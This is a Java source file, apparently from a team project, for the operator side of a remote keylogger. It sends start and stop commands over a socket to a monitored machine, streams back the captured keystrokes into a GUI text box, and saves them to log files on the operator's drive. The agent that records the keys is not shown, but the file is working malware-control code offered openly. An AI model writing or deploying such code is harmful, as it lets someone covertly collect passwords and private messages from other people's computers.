package team6.client.handler;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import team6.client.gui.ControlGUI;
import team6.client.socket.SocketHandler;

public class Keylogger {

    private ControlGUI controlGUI;
    private SocketHandler socketHandler;
    public String saveLocation;

    public Keylogger(ControlGUI controlGUI, Socket socket) throws IOException {
        this.controlGUI = controlGUI;
        this.socketHandler = new SocketHandler(socket);
        saveLocation = "D:/team6_logs/keylog";
    }

    public void startKeyLog() throws IOException {
        Thread th = new Thread() {
            @Override
            public void run() {
                try {
                    socketHandler.send("<START>$<>");
                    while (controlGUI.btnKeyLog.isSelected()) {
                        String keyText;
                        synchronized (socketHandler) {
                            keyText = new String(socketHandler.receive());
                        }

                        controlGUI.txtKeylog.setText(controlGUI.txtKeylog.getText() + keyText);
                    }
                } catch (IOException ex) {
                    Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        };
        th.start();
    }

    public void stopKeyLog() throws IOException {
        socketHandler.send("<STOP>$<>");
    }

    public void saveLog() {
        Thread th = new Thread() {
            @Override
            public void run() {
                if (controlGUI.txtKeylog.getText().equals("")) {
                    return;
                }

                File dir = new File(saveLocation);
                if (!dir.exists()) {
                    dir.mkdirs();
                }

                String fileName = "Keylog";
                File file = new File(saveLocation + "\\" + fileName + ".txt");

                int count = 0;
                while (file.exists()) {
                    count++;
                    file = new File(saveLocation + "\\" + fileName + " (" + count + ").txt");
                }

                try {
                    FileOutputStream out = new FileOutputStream(file);
                    String buff = controlGUI.txtKeylog.getText();
                    out.write(buff.getBytes());
                    out.flush();
                    out.close();
                    JOptionPane.showMessageDialog(controlGUI, "Saved to " + file.getAbsolutePath());
//                    System.out.println("Saved to " + file.getAbsolutePath());
                } catch (IOException ex) {
                    JOptionPane.showMessageDialog(controlGUI, "Error!");
                    Logger.getLogger(Monitor.class.getName()).log(Level.SEVERE, null, ex);
                    file.delete();
                }
            }
        };
        th.start();
    }

    public void close() {
        socketHandler.close();
    }
}
